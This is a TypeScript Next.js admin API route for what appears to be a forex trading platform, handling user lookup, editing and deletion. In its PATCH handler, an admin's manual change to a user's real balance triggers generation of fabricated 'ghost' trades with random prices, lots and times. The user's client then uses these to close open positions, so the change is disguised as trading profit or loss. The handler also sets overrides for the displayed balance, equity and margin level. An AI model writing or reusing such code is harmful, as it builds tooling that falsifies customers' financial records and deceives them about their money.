/**
 * GET    /api/admin/users/[id]  — detalhe do utilizador
 * PATCH  /api/admin/users/[id]  — editar dados (balance, status, overrides, etc.)
 * DELETE /api/admin/users/[id]  — remover utilizador
 *
 * Fonte de dados:
 *   - Com SUPABASE_SERVICE_ROLE_KEY → Supabase (profiles + accounts + admin_overrides)
 *   - Sem service role key           → userStore (localStorage local)
 */

import { NextRequest, NextResponse } from "next/server";
import { createServerClient, hasServiceRole } from "@/lib/supabase-server";
import { userStore } from "@/lib/user-store";
import { adminOverrideStore } from "@/lib/admin-override-store";
import { generateGhostPnl } from "@/lib/adjustment-utils";
import { ghostPendingStore, type GhostTrade } from "@/lib/ghost-pending-store";
import { requireAdmin } from "@/lib/admin-auth";

// ─── GET /api/admin/users/[id] ────────────────────────────────────────────────
export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = await requireAdmin(req);
  if (unauth) return unauth;

  if (!hasServiceRole()) {
    return NextResponse.json(
      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
      { status: 503 },
    );
  }

  const { id } = await params;

  if (hasServiceRole()) {
    const sb = createServerClient();
    const { data, error } = await sb
      .from("profiles")
      .select("*, accounts(*)")
      .eq("id", id)
      .single();

    if (error)
      return NextResponse.json(
        { error: "Utilizador não encontrado" },
        { status: 404 },
      );

    // Adicionar override em memória ao resultado
    const memOv = adminOverrideStore.get(id);
    return NextResponse.json({
      success: true,
      data: { ...data, _memOverride: memOv },
      source: "supabase",
    });
  }

  const user = userStore.getById(id);
  if (!user)
    return NextResponse.json(
      { error: "Utilizador não encontrado" },
      { status: 404 },
    );
  return NextResponse.json({ success: true, data: user, source: "local" });
}

// ─── PATCH /api/admin/users/[id] ─────────────────────────────────────────────
export async function PATCH(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = await requireAdmin(req);
  if (unauth) return unauth;

  if (!hasServiceRole()) {
    return NextResponse.json(
      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
      { status: 503 },
    );
  }

  const { id } = await params;

  try {
    const body = await req.json();

    if (hasServiceRole()) {
      const sb = createServerClient();

      const warnings: string[] = [];

      // ── 0. Ler estado atual ──────────────────────────────────────────────
      // Admin opera SEMPRE na conta real
      const [{ data: currentAccounts }, { data: currentProfile }] =
        await Promise.all([
          sb
            .from("accounts")
            .select("id, balance, leverage, currency")
            .eq("user_id", id)
            .eq("mode", "real"),
          sb.from("profiles").select("mode").eq("id", id).single(),
        ]);
      const currentRealAccount =
        (
          currentAccounts as
            | {
                id: string;
                balance: number;
                leverage: number;
                currency: string;
              }[]
            | null
        )?.[0] ?? null;
      const currentBalance = currentRealAccount?.balance ?? null;
      const currentAccountId = currentRealAccount?.id ?? null;
      // Ignorar body.mode — admin sempre opera em modo real
      const currentMode: "demo" | "real" = "real";

      // ── 1. Atualizar profiles (DB) ──────────────────────────────────────
      const profilePatch: Record<string, unknown> = {};
      if ("firstName" in body || "lastName" in body) {
        const fn = body.firstName ?? "";
        const ln = body.lastName ?? "";
        profilePatch.first_name = fn;
        profilePatch.last_name = ln;
        profilePatch.name =
          [fn, ln].filter(Boolean).join(" ").trim() || fn || ln;
      }
      if ("phone" in body) profilePatch.phone = body.phone;
      if ("country" in body) profilePatch.country = body.country;
      if ("kycStatus" in body) profilePatch.kyc_status = body.kycStatus;
      if ("status" in body) profilePatch.status = body.status;
      if ("mode" in body) profilePatch.mode = body.mode;

      if (Object.keys(profilePatch).length > 0) {
        const { error: profErr } = await sb
          .from("profiles")
          .update(profilePatch)
          .eq("id", id);
        if (profErr) {
          console.error("[admin PATCH] profiles:", profErr.message);
          warnings.push("Perfil: " + profErr.message);
        }
      }

      // ── 2. Atualizar saldo real (DB) ────────────────────────────────────
      const sharedFields: Record<string, unknown> = {};
      if (
        "leverage" in body &&
        typeof body.leverage === "number" &&
        Number(body.leverage) !== Number(currentRealAccount?.leverage)
      ) {
        sharedFields.leverage = body.leverage;
      }
      if (
        "currency" in body &&
        typeof body.currency === "string" &&
        body.currency !== (currentRealAccount?.currency ?? null)
      ) {
        sharedFields.currency = body.currency;
      }

      // Admin só altera conta real — ignoramos demoBalance, usamos realBalance ou balance
      const newRealBalance: number | null =
        "realBalance" in body && typeof body.realBalance === "number"
          ? body.realBalance
          : "balance" in body && typeof body.balance === "number"
            ? body.balance
            : null;

      const balanceToSet: number | null = newRealBalance;

      const anyBalanceChanged =
        balanceToSet !== null &&
        (currentBalance === null ||
          Number(balanceToSet) !== Number(currentBalance));

      if (balanceToSet !== null || Object.keys(sharedFields).length > 0) {
        const accountPatch: Record<string, unknown> = { ...sharedFields };
        if (balanceToSet !== null) accountPatch.balance = balanceToSet;

        let accountWriteOk = false;

        if (currentAccountId) {
          const { error: accUpdateErr } = await sb
            .from("accounts")
            .update(accountPatch)
            .eq("id", currentAccountId);

          if (accUpdateErr) {
            console.error(
              "[admin PATCH] accounts update:",
              accUpdateErr.message,
            );
            warnings.push("Conta (campos): " + accUpdateErr.message);
          } else {
            accountWriteOk = true;
          }
        } else {
          const { error: accInsertErr } = await sb.from("accounts").insert({
            id: crypto.randomUUID(),
            user_id: id,
            mode: "real",
            balance: balanceToSet ?? 0,
            leverage:
              typeof sharedFields.leverage === "number"
                ? sharedFields.leverage
                : 200,
            currency:
              typeof sharedFields.currency === "string"
                ? sharedFields.currency
                : "USD",
            status: "active",
          });

          if (accInsertErr) {
            console.error(
              "[admin PATCH] accounts insert:",
              accInsertErr.message,
            );
            warnings.push("Conta (campos): " + accInsertErr.message);
          } else {
            accountWriteOk = true;
          }
        }

        if (balanceToSet !== null && accountWriteOk) {
          const delta = balanceToSet - (currentBalance ?? 0);

          // ── Gerar P/Ls e guardar na memória do servidor ───────────────────
          // O cliente vai buscá-los via polling em /api/user/ghost-trades.
          // Modo "close_open": o cliente fecha as posições abertas com estes P/Ls.
          // Se não tiver posições abertas, cria operações novas no histórico.
          console.log(
            `[ghost] userId=${id} currentBalance=${currentBalance} balanceToSet=${balanceToSet} delta=${delta}`,
          );
          if (Math.abs(delta) >= 0.01) {
            const pnlValues = generateGhostPnl(delta, 3);

            const symbols = ["EURUSD", "GBPUSD", "USDJPY", "AUDUSD", "USDCAD"];
            const icons = ["🇪🇺", "🇬🇧", "🇯🇵", "🇦🇺", "🇨🇦"];
            const refPrices = [1.085, 1.265, 149.5, 0.645, 1.36];

            const now = new Date();
            const trades: GhostTrade[] = pnlValues.map((pnl, i) => {
              const idx = i % symbols.length;
              const openPrice = parseFloat(
                (refPrices[idx] + (Math.random() * 0.006 - 0.003)).toFixed(5),
              );
              const lots = parseFloat((0.01 + Math.random() * 0.09).toFixed(2));
              const closePrice = parseFloat(
                (openPrice + pnl / (lots * 100_000)).toFixed(5),
              );
              const amount = parseFloat(
                Math.max(50, Math.abs(pnl) * 8).toFixed(2),
              );
              const openedAt = new Date(
                now.getTime() - (1 + Math.random() * 23) * 3_600_000,
              ).toISOString();
              const closedAt = new Date(
                now.getTime() - (1 + Math.random() * 59) * 60_000,
              ).toISOString();
              return {
                id: crypto.randomUUID(),
                symbol: symbols[idx],
                icon: icons[idx],
                type: "buy" as const,
                lots,
                amount,
                leverage: 200,
                openPrice,
                closePrice,
                pnl,
                openedAt,
                closedAt,
                closeReason: "adjustment",
              };
            });

            // Guardar: pnls para fechar posições abertas + trades de fallback
            ghostPendingStore.set(id, {
              mode: "close_open",
              pnls: pnlValues,
              totalDelta: delta, // soma exacta para redistribuição
              trades, // usados se o cliente não tiver posições abertas
            });
            console.log(
              `[ghost] stored pnls=${JSON.stringify(pnlValues)} for user ${id}`,
            );
          }

          // Auditoria (best-effort, falha silenciosa)
          await sb
            .from("balance_adjustments")
            .insert({
              user_id: id,
              previous_balance: currentBalance ?? 0,
              new_balance_input: balanceToSet,
              open_positions: 0,
              reason: body.adjustmentReason ?? "Ajuste manual via painel admin",
            })
            .then(() => {});
        }
      }

      const forcedMode: "real" = "real";

      // ── 3. Guardar overrides em memória — sempre modo real ──────────────
      adminOverrideStore.set(id, {
        ...(balanceToSet !== null ? { balance: balanceToSet } : {}),
        mode: "real",
        // forceClose + forceEpochReset: cliente fecha posições e recalcula epoch
        ...(anyBalanceChanged
          ? { forceClose: true, forceEpochReset: true }
          : {}),
        ...(body.marginLevelOverride !== undefined
          ? { marginLevelOverride: body.marginLevelOverride }
          : {}),
        ...(body.equityOverride !== undefined
          ? { equityOverride: body.equityOverride }
          : {}),
        ...(body.adminNotes !== undefined ? { note: body.adminNotes } : {}),
      });

      // ── 4. Persistir overrides no DB (produção / multi-instância) ───────
      // Schema real: admin_overrides.id = FK → profiles.id (relação 1:1)
      // Colunas: id, display_balance, display_equity, display_margin_level, notes
      const dbOverridePatch: Record<string, unknown> = {};
      if (body.marginLevelOverride !== undefined) {
        dbOverridePatch.display_margin_level = body.marginLevelOverride;
      }
      if (body.equityOverride !== undefined) {
        dbOverridePatch.display_equity = body.equityOverride;
      }
      if (body.adminNotes !== undefined) {
        dbOverridePatch.notes = body.adminNotes ?? "";
      }
      if (balanceToSet !== null) {
        dbOverridePatch.display_balance = balanceToSet;
      }

      const { data: existingOverride, error: existingErr } = await sb
        .from("admin_overrides")
        .select("id")
        .eq("id", id)
        .maybeSingle();

      if (existingErr) {
        console.error(
          "[admin PATCH] admin_overrides select error:",
          existingErr.message,
        );
        warnings.push("Admin override (query): " + existingErr.message);
      } else if (existingOverride?.id) {
        // Update da linha existente (id = user id)
        const { error: ovUpdateErr } = await sb
          .from("admin_overrides")
          .update(dbOverridePatch)
          .eq("id", id);
        if (ovUpdateErr) {
          console.error(
            "[admin PATCH] admin_overrides update error:",
            ovUpdateErr.message,
          );
          warnings.push("Admin override (update): " + ovUpdateErr.message);
        }
      } else {
        // Inserir nova linha — id = user_id (FK para profiles.id)
        const { error: ovInsertErr } = await sb
          .from("admin_overrides")
          .insert({ id, ...dbOverridePatch });
        if (ovInsertErr) {
          console.error(
            "[admin PATCH] admin_overrides insert error:",
            ovInsertErr.message,
          );
          warnings.push("Admin override (insert): " + ovInsertErr.message);
        }
      }

      return NextResponse.json({
        success: true,
        source: "supabase",
        balanceChanged: anyBalanceChanged,
        forcedMode,
        warnings: warnings.length > 0 ? warnings : undefined,
      });
    }

    // ── Fallback: userStore ────────────────────────────────────────────────
    const allowed = [
      "firstName",
      "lastName",
      "phone",
      "country",
      "mode",
      "status",
      "balance",
      "leverage",
      "currency",
      "balanceOverride",
      "marginLevelOverride",
      "equityOverride",
      "adminNotes",
      "kycStatus",
      "totalDeposited",
      "totalWithdrawn",
    ];
    const patch: Record<string, unknown> = {};
    for (const key of allowed) {
      if (key in body) patch[key] = body[key];
    }

    const updated = userStore.update(id, patch);
    if (!updated)
      return NextResponse.json(
        { error: "Utilizador não encontrado" },
        { status: 404 },
      );
    return NextResponse.json({ success: true, data: updated, source: "local" });
  } catch {
    return NextResponse.json({ error: "Erro interno" }, { status: 500 });
  }
}

// ─── DELETE /api/admin/users/[id] ────────────────────────────────────────────
export async function DELETE(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) {
  const unauth = await requireAdmin(req);
  if (unauth) return unauth;

  if (!hasServiceRole()) {
    return NextResponse.json(
      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
      { status: 503 },
    );
  }

  const { id } = await params;

  if (hasServiceRole()) {
    const sb = createServerClient();
    const { error } = await sb.auth.admin.deleteUser(id);
    if (error)
      return NextResponse.json({ error: error.message }, { status: 400 });
    return NextResponse.json({ success: true, source: "supabase" });
  }

  const deleted = userStore.delete(id);
  if (!deleted)
    return NextResponse.json(
      { error: "Utilizador não encontrado" },
      { status: 404 },
    );
  return NextResponse.json({ success: true, source: "local" });
}
